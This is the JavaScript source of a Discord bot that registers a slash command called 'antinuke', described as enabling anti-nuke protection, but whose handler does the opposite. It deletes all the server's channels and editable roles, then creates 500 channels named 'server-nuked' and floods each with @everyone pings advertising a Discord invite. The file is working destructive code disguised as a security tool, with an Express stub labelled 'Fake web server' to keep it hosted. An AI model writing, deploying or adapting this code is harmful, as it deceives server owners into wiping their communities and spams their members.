import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);
/* =========================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "server-nuked";
const CREATE_COUNT = 500;
const MSG_PER_CHANNEL = 3;
const DELETE_DELAY = 60;
const CREATE_DELAY = 50;
const MESSAGE_DELAY = 100;
/* ================== */

const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Bật Anti nuke")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  await rest.put(
    Routes.applicationCommands(process.env.CLIENT_ID),
    { body: commands }
  );
  console.log("✅ Slash command registered");
})();

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;

  const guild = interaction.guild;

  const control = await guild.channels.create({
    name: "antinuke-control",
    type: ChannelType.GuildText
  });

  await control.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");

  /* ===== XOÁ CHANNEL ===== */
  for (const ch of guild.channels.cache.values()) {
    if (ch.id === control.id) continue;
    try {
      await ch.delete();
      await sleep(DELETE_DELAY);
    } catch {}
  }

  /* ===== XOÁ ROLE ===== */
  const botPos = guild.members.me.roles.highest.position;
  const roles = guild.roles.cache.filter(r =>
    r.editable && r.name !== "@everyone" && r.position < botPos
  );

  for (const role of roles.values()) {
    try {
      await role.delete();
      await sleep(DELETE_DELAY);
    } catch {}
  }

  await control.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");

  /* ===== TẠO KÊNH + GỬI TIN ===== */
  for (let i = 0; i < CREATE_COUNT; i++) {
    try {
      const ch = await guild.channels.create({
        name: CHANNEL_NAME,
        type: ChannelType.GuildText
      });

      for (let j = 0; j < MSG_PER_CHANNEL; j++) {
        await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
        await sleep(MESSAGE_DELAY);
      }

      await sleep(CREATE_DELAY);
    } catch {}
  }

  await control.send("✅ Hoàn tất.");
});

client.login(process.env.BOT_TOKEN);
